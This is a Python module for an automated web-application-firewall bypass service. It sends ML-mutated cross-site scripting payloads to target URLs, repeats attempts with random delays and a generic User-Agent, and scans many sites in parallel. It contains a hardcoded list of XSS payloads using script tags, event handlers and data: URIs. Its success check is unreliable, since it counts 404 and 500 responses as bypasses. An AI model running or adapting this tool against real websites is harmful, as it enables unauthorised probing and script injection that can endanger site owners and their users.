"""
Main WAF Bypass Service
Orchestrates all components using dependency injection
"""

from typing import List, Optional, Dict, Any
import time
import random
import logging
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm

from interfaces import (
    IMLModel, IPayloadMutator, IInputValidator, IWAFDetector,
    IWAFBypassService, ILogger, IHTTPClient, IErrorHandler
)
from exceptions import ErrorContext, error_handler, ValidationException
from di_container import get_container


class WAFBypassService(IWAFBypassService):
    """
    Main WAF bypass service that orchestrates all components
    Uses dependency injection for clean architecture
    """

    def __init__(self):
        # Get services from dependency injection container
        container = get_container()

        self.ml_model: IMLModel = container.resolve(IMLModel)
        self.payload_mutator: IPayloadMutator = container.resolve(IPayloadMutator)
        self.input_validator: IInputValidator = container.resolve(IInputValidator)
        self.waf_detector: IWAFDetector = container.resolve(IWAFDetector)
        self.logger: ILogger = container.resolve(ILogger)
        self.http_client: IHTTPClient = container.resolve(IHTTPClient)
        self.error_handler: IErrorHandler = container.resolve(IErrorHandler)

        # Service configuration
        self.max_attempts = 50
        self.min_delay = 1.0
        self.max_delay = 5.0

        # Statistics
        self.stats = {
            "total_urls_processed": 0,
            "successful_bypasses": 0,
            "failed_bypasses": 0,
            "waf_detected": 0,
            "errors": 0
        }

        self.logger.info("WAF Bypass Service initialized with dependency injection")

    def evade_waf(self, url: str) -> bool:
        """
        Attempt to bypass WAF on a given URL

        Args:
            url: The URL to test for WAF bypass

        Returns:
            True if bypass was successful, False otherwise
        """
        with ErrorContext(error_handler, "waf_evasion"):
            try:
                self.logger.info(f"Starting WAF evasion for: {url}")
                self.stats["total_urls_processed"] += 1

                # Validate URL
                is_valid, result = self.input_validator.validate_url(url)
                if not is_valid:
                    raise ValidationException(result, "url", url)

                validated_url = result

                # Check if WAF is present
                if not self.waf_detector.detect_waf(validated_url):
                    self.logger.info(f"No WAF detected for {validated_url}")
                    return True  # No WAF means we "bypassed" it

                self.stats["waf_detected"] += 1

                # Attempt evasion
                success = self._attempt_evasion(validated_url)

                if success:
                    self.stats["successful_bypasses"] += 1
                    self.logger.info(f"Successfully bypassed WAF for {validated_url}")
                else:
                    self.stats["failed_bypasses"] += 1
                    self.logger.warning(f"Failed to bypass WAF for {validated_url}")

                return success

            except Exception as e:
                self.stats["errors"] += 1
                self.logger.error(f"WAF evasion failed for {url}: {e}")
                return False

    def _attempt_evasion(self, url: str) -> bool:
        """
        Perform the actual evasion attempts using ML-guided mutations

        Args:
            url: Validated URL to test

        Returns:
            True if any attempt succeeded
        """
        # Start with truly malicious payloads that should definitely be blocked
        malicious_payloads = [
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            "<img src=x onerror=\"javascript:alert('XSS')\">",
            "<svg onload=\"javascript:alert('XSS')\">",
            "<iframe src=\"data:text/html,<script>alert('XSS')</script>\"></iframe>",
            "<object data=\"data:text/html,<script>alert('XSS')</script>\"></object>",
            "<embed src=\"data:text/html,<script>alert('XSS')</script>\">",
            "<meta http-equiv=\"refresh\" content=\"0;url=data:text/html,<script>alert('XSS')</script>\">",
            "<link rel=\"import\" href=\"data:text/html,<script>alert('XSS')</script>\">",
            "<form action=\"javascript:alert('XSS')\"><input type=\"submit\"></form>",
            "<a href=\"javascript:alert('XSS')\">Click me</a>",
            "<div onmouseover=\"javascript:alert('XSS')\">Hover me</div>",
            "<input type=\"text\" onfocus=\"javascript:alert('XSS')\">",
        ]

        # Pick a random malicious payload to start with
        initial_payload = random.choice(malicious_payloads)
        payload = self.input_validator.validate_payload(initial_payload)[1]

        self.logger.info(f"Starting with malicious payload: {payload[:50]}{'...' if len(payload) > 50 else ''}")

        for attempt in range(self.max_attempts):
            try:
                # Use ML model to choose mutation
                payload = self.payload_mutator.mutate(payload, self.ml_model)

                # Make request
                response = self.http_client.get(
                    url,
                    params={"q": payload},
                    timeout=10,
                    headers={"User-Agent": "Mozilla/5.0 (compatible)"}
                )

                # Calculate reward and check success
                reward = self._calculate_reward(response)

                if reward == 1:
                    self.logger.info(f"Success on attempt {attempt + 1} with payload: {payload[:50]}...")
                    return True

                # Update ML model
                self.ml_model.update(payload, reward)

                # Rate limiting
                delay = random.uniform(self.min_delay, self.max_delay)
                time.sleep(delay)

            except Exception as e:
                self.logger.warning(f"Attempt {attempt + 1} failed: {e}")
                # Penalize failed attempts
                self.logger.info(f"ML PENALTY: Calling update with failure reward -1")
                self.ml_model.update(payload, -1)

        return False

    def _calculate_reward(self, response) -> int:
        """Calculate reward based on response"""
        if response.status_code in [200, 201, 202, 301, 302, 404, 500]:
            return 1  # Payload executed successfully (could indicate bypass or no WAF)
        elif response.status_code in [403, 406, 429]:
            return -1  # Blocked by WAF
        else:
            return 0  # Other status codes - neutral

    def scan_urls(self, urls: List[str], workers: int = 3, detect_only: bool = False) -> Dict[str, Any]:
        """
        Scan multiple URLs for WAF detection/bypass

        Args:
            urls: List of URLs to scan
            workers: Number of worker threads
            detect_only: Only detect WAF, don't attempt bypass

        Returns:
            Scan results summary
        """
        self.logger.info(f"Starting scan of {len(urls)} URLs with {workers} workers")

        results = {"detected": [], "not_detected": [], "errors": []}

        with ThreadPoolExecutor(max_workers=min(workers, 5)) as executor:
            if detect_only:
                self.logger.info("Running WAF detection only")
                futures = [executor.submit(self._detect_single_url, url) for url in urls]

                for future in tqdm(futures, desc="Detecting WAF"):
                    url, has_waf, error = future.result()
                    if error:
                        results["errors"].append(url)
                        self.stats["errors"] += 1
                    elif has_waf:
                        results["detected"].append(url)
                        self.stats["waf_detected"] += 1
                    else:
                        results["not_detected"].append(url)

                # Update total URLs processed for detection-only mode
                self.stats["total_urls_processed"] += len(urls)
            else:
                self.logger.info("Running full WAF bypass attempts")
                futures = [executor.submit(self.evade_waf, url) for url in urls]

                for future in tqdm(futures, desc="Evading WAF"):
                    try:
                        success = future.result()
                        # Individual results tracked in evade_waf method
                    except Exception as e:
                        self.logger.error(f"Error processing URL: {e}")
                        results["errors"].append("unknown")

        return results

    def _detect_single_url(self, url: str) -> tuple[str, bool, Optional[str]]:
        """Detect WAF for a single URL (for parallel processing)"""
        try:
            has_waf = self.waf_detector.detect_waf(url)
            return url, has_waf, None
        except Exception as e:
            return url, False, str(e)

    def get_statistics(self) -> Dict[str, Any]:
        """Get comprehensive statistics"""
        ml_stats = self.ml_model.get_stats()
        error_stats = self.error_handler.get_error_stats()

        return {
            "service_stats": self.stats.copy(),
            "ml_stats": ml_stats,
            "error_stats": error_stats,
            "success_rate": (self.stats["successful_bypasses"] /
                           max(self.stats["total_urls_processed"], 1) * 100),
            "waf_detection_rate": (self.stats["waf_detected"] /
                                 max(self.stats["total_urls_processed"], 1) * 100)
        }

    def reset_statistics(self):
        """Reset all statistics"""
        self.stats = {
            "total_urls_processed": 0,
            "successful_bypasses": 0,
            "failed_bypasses": 0,
            "waf_detected": 0,
            "errors": 0
        }

    def update_configuration(self, config: Dict[str, Any]):
        """Update service configuration"""
        if "max_attempts" in config:
            self.max_attempts = config["max_attempts"]
        if "min_delay" in config:
            self.min_delay = config["min_delay"]
        if "max_delay" in config:
            self.max_delay = config["max_delay"]

        self.logger.info(f"Configuration updated: {config}")


def create_waf_bypass_service() -> IWAFBypassService:
    """Factory function to create WAF bypass service with all dependencies"""
    return WAFBypassService()
